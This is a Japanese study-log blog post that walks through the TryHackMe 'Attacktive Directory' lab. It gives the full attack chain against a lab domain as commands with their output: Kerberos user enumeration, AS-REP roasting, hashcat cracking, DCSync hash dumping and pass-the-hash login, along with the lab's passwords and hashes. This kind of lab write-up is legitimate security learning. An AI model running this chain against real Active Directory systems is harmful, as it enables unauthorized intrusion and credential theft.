---
title: "7日間でハッキングをはじめる本 - 勉強記録6"
emoji: "😎"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: ["linux", "kalilinux", "wsl2", "security"]
published: true
---

こちらの本を勉強中に気になった用語や作業をまとめていきます。

[![](/images/7days-hack-06/2026-01-11-12-02-12.png =250x)](https://amzn.to/4aP6SeL)
**7日間でハッキングをはじめる本 TryHackMeを使って身体で覚える攻撃手法と脆弱性**

## 取り組んでいる課題

Windows Server の Active Directory 周りの脆弱性について学べます。

https://tryhackme.com/room/attacktivedirectory

## Kerberos認証

とある機能Aを提供するサーバへのアクセス権を取得する際に、

1. クライアントの秘密鍵で暗号化した情報をもとに、身分証明書を発行するサービス
2. 身分証明書を確認し、アクセス権を発行するサービス
3. アクセス権を確認し、機能Aを提供するサービス

を全て別々にし、セキュアな認証を行う方法。
認証情報が一定時間保持されるので、機能Aのサービスにアクセスするたびに認証する必要がなく、効率的。

それぞれ以下のような名前で呼ばれている。

1. `AS(Authentication Service)`
   - 身分証明書： `TGT(Ticket-Granting Ticket)`
   - ASによるReplyを `AS-REP` という
     - この AS-REP には、TGTに加え申請ユーザのパスワードのハッシュ値を使って暗号化したものが含まれている。
2. `TGS(Ticket-Granting Service)`
   - アクセス権： `ST(Service Ticket)`
3. ファイルサーバなど、任意のサービス


## AS-REP Roasting 攻撃

ASによる身分証明書の発行の暗号鍵確認フロー(**事前認証**)は管理者が無効にしている場合があり、その抜け穴を突いて侵入することが出来る(場合がある)。

その事前認証が設定されていないドメインユーザについては、攻撃者がドメインユーザのフリをして`TGT`を入手出来る。

## Kerbrute

Kerberos認証を利用しているドメインユーザを列挙するためのツール。

https://github.com/ropnop/kerbrute

実行例：

```sh
$ ./kerbrute_linux_amd64 userenum -d spookysec.local --dc spookysec.local userlist.txt
$ ./kerbrute_linux_amd64 userenum -d <DomainName> --dc <DomainControllerName> <辞書ファイルパス>
```

実行結果：

```
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 01/12/26 - Ronnie Flathers @ropnop

2026/01/12 14:21:06 >  Using KDC(s):
2026/01/12 14:21:06 >   spookysec.local:88

2026/01/12 14:21:07 >  [+] VALID USERNAME:       james@spookysec.local
2026/01/12 14:21:09 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2026/01/12 14:21:12 >  [+] VALID USERNAME:       James@spookysec.local
2026/01/12 14:21:13 >  [+] VALID USERNAME:       robin@spookysec.local
2026/01/12 14:21:24 >  [+] VALID USERNAME:       darkstar@spookysec.local
2026/01/12 14:21:36 >  [+] VALID USERNAME:       administrator@spookysec.local
2026/01/12 14:21:50 >  [+] VALID USERNAME:       backup@spookysec.local
2026/01/12 14:21:56 >  [+] VALID USERNAME:       paradox@spookysec.local
2026/01/12 14:22:38 >  [+] VALID USERNAME:       JAMES@spookysec.local
2026/01/12 14:22:52 >  [+] VALID USERNAME:       Robin@spookysec.local
2026/01/12 14:24:16 >  [+] VALID USERNAME:       Administrator@spookysec.local
2026/01/12 14:27:08 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2026/01/12 14:28:01 >  [+] VALID USERNAME:       Paradox@spookysec.local
2026/01/12 14:31:21 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2026/01/12 14:32:13 >  [+] VALID USERNAME:       ori@spookysec.local
2026/01/12 14:33:55 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2026/01/12 14:38:11 >  Done! Tested 73317 usernames (16 valid) in 1025.236 seconds
```

以下2つが怪しいユーザ。(より上位の権限を持っていそうなユーザ)

- `svc-admin@spookysec.local`
- `backup@spookysec.local`

## Impacket

Kerbruteで割り出したドメインユーザ情報を用いて、AS-REP を要求するためのツール。
Kali Linux なら `/usr/share/doc/python3-impacket/` にインストールされている。

今回は `GetNPUsers.py` というスクリプトを使ってAS-REPを要求する。

```sh
$ ./GetNPUsers.py spookysec.local/svc-admin
```

AS-REP から TGT とパスワードハッシュが得られた。

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a7b30cc(中略)$(中略)8b79500


$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a7b30cc77dc6fa3d61426de607449881$1ac49979dbbf58ad3d1168f39206ecfcd6c7c4bb532db35e38dc9706aff53dec38e0f49ec7c3c97a96555921fc2562d2cc953f58c8dd41d945a01feab04d342df47c24dbccf58a2482fe37252529dc33e97b97f651f81e596fab41ac83ed5108b8cac7e1ba89d1a67ff27d5836fea666b031c270a88e2b6c72562617e0cc509dba7008eb80d108a4ad64e3c3d703507a40c3c1774e1881099d6214f6289290fc4af19f6a40e91333e68861406e53c2d58a423b54bdb6cb27bb79e18b0531e7b2b4ef5d9de995693d740f7e5819dfb3816ef7683ccdf43322e529c6f7c59225cc33a66cebe5d945a9988166ac4b63b8b79500
```

## hashcat によるパスワード解析

`hashcat` は、ハッシュ値からパスワードを逆引きするためのツール。

まずは Kerberos 認証に対応するハッシュタイプを検索。
`-h` ではなく、`-hh` としないと全てのハッシュタイプが表示されなかった。

```sh
$ hashcat -hh | grep Kerberos
```

結果：

```
19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
32100 | Kerberos 5, etype 17, AS-REP                               | Network Protocol
19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
32200 | Kerberos 5, etype 18, AS-REP                               | Network Protocol
7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```

`AS-REP` に対応するハッシュタイプは `18200` と分かった。

計算実行：

```sh
$ hashcat -m 18200 hash.txt passwordlist.txt
```

パスワードが割り出せた。

management2005


## ファイルサーバへアクセス

Listing:

```sh
$ smbclient -L \\\\spookysec.local -U svc-admin
```

```sh
$ cat backup_credentials.txt | base64 -d
backup@spookysec.local:backup2517860
```

## DCSync攻撃

`MS-DRSR`というドメインコントローラ間で使用されるプロトコルを悪用し、既存のドメインコントローラに対してデータの同期を要求してパスワードハッシュを取得する攻撃。

Impacketの `secretsdump.py` を使うと、ドメインコントローラが持つ情報をDumpすることが出来る。

```sh
$ ./secretsdump.py -just-dc-ntlm backup@spookysec.local -outputfile spookysec
```

管理者パスワードのNTLMハッシュが得られた。

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

## Pass the Hash 攻撃

パスワードのハッシュ値を認証情報としてそのまま利用することで、ターゲットになりすます攻撃。
パスワードを割り出す必要が無い。

NTLM認証は **チャレンジ＆レスポンス方式** なので、クライアント側でどうにかしてNTLMハッシュを取得できれば、 `Pass the Hash` を利用してログインすることが出来る。

## Evil-WinRM

Pass the Hash 攻撃を行うためのツール。

コマンド例：

```sh
$ evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

ターゲットマシンにログインできた。やりたい放題。

## まとめ

- nmap で詳細ポートスキャンし、ドメイン名を取得
- kerbrute でドメインに対し、ユーザ名辞書攻撃し、怪しいユーザを割り出す
- Impacket で、認証をすり抜けて AS-REP を受け取る
    - AS-REP には、ユーザのパスワードハッシュで暗号化されたデータが含まれる
- hashcat で辞書攻撃を行い暗号化データを解析し、パスワードを割り出す。以下hashcatのアルゴリズム：
    1. 適当なパスワードを用意し、Kerberosで使われているものと同じアルゴリズムでハッシュ化
    2. ハッシュを使って、暗号化データを復号Try。
    3. 復号結果を検証 (Nonceがあるか？パース結果が正常か？)
    4. 検証が正しければパスワード確定。不正なら1番に戻る。
- 割り出したパスワードをもとにファイルサーバにアクセス。他のユーザのパスワードを得る。
- DCSync攻撃を利用し、管理者のパスワードのNTLMハッシュを得る。
- Pass the Hash攻撃を利用し、ターゲットマシンにログインする


## リンク

前回：

https://zenn.dev/kaiware0x/articles/7days-hack-05

次回：

<!-- https://zenn.dev/kaiware0x/articles/7days-hack-06 -->
